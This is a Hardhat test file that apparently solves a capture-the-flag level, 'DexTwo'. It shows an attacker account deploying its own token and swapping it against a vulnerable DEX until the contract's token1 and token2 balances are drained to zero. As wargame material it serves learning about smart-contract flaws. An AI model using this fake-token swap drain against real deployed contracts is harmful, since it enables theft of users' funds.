
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();
        const Level23 = await hre.ethers.getContractFactory("DexTwo");
        const level23 = await Level23.deploy();
        await level23.deployed();

        const Token = await hre.ethers.getContractFactory("SwappableTokenTwo");

        // create 110 of each token, send 10 of each to otherAccount
        const token1 = await Token.deploy(level23.address, "token1", "T1", 110);
        await token1.deployed();
        const token2 = await Token.deploy(level23.address, "token2", "T2", 110);
        await token2.deployed();

        level23.connect(owner).setTokens(token1.address, token2.address);

        token1.connect(owner).transfer(otherAccount.address, 10);
        token2.connect(owner).transfer(otherAccount.address, 10);
        token1.connect(owner).transfer(level23.address, 100);
        token2.connect(owner).transfer(level23.address, 100);

        console.log(
          `Level23 deployed at address ${level23.address}`
        )
        console.log(
          `Token1 deployed at address ${token1.address}`
        )
        console.log(
          `Token2 deployed at address ${token2.address}`
        )
        return {level23, token1, token2, owner, otherAccount};
    }

    /*
    This level will ask you to break DexTwo, a subtlely modified Dex contract from the 
    previous level, in a different way.

    You need to drain all balances of token1 and token2 from the DexTwo contract to 
    succeed in this level.
    */
    describe("Solve", function() {
        it("Should solve level23", async function() {
            const {level23, token1, token2, owner, otherAccount} = await loadFixture(deployFallback);

            const MyToken = await hre.ethers.getContractFactory("SwappableTokenTwo", otherAccount);
            // create 1000 of our own token and send 100 to the DEX just to simplify
            // the exchange rate
            const mytoken = await MyToken.deploy(level23.address, "mytoken", "MT", 1000);
            await mytoken.connect(otherAccount).transfer(level23.address, 100);

            await mytoken.connect(otherAccount).approve2(otherAccount.address, level23.address, 1000);
            
            // Level23 has 100 of our tokens, so we can exchange 100 more for its 100
            // Token1 tokens (100 * 100 Token1 / 100 mytoken) = 100 swapAmount
            await level23.connect(otherAccount).swap(mytoken.address, token1.address, 100);
            // Level23 now has 200 of our tokens, so we can exchange 200 more for its 100
            // Token2 tokens (200 * 100 Token2 / 200 mytoken) = 100 swapAmount
            await level23.connect(otherAccount).swap(mytoken.address, token2.address, 200);

            let token1Balance = await level23.connect(otherAccount).balanceOf(token1.address, level23.address);
            let token2Balance = await level23.connect(otherAccount).balanceOf(token2.address, level23.address);
            expect (token1Balance).to.eq(0);
            expect (token2Balance).to.eq(0);
        })
    });
});